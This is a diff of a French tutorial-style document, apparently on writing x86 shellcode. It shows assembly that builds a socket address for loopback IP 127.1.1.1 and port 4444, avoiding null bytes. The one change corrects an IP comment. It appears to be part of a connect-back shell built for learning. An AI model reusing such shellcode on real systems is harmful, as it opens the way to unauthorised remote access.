@@ -22,7 +22,7 @@ La principal référence bibliographique est la documentation des appels systèm
 Nous procédons de la même manière pour créer la connexion en indiquant l'adresse IP et le port logique. Nous nous sommes appuyé sur la structure sockaddr afin de connaître les différents élément necessaires.
 
 ```c
-	push 0x0101017f	; @Ip 127.0.0.1
+	push 0x0101017f	; @Ip 127.1.1.1
 	push dword 0x5c11 ; Port 4444
 	inc ebx
     	push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
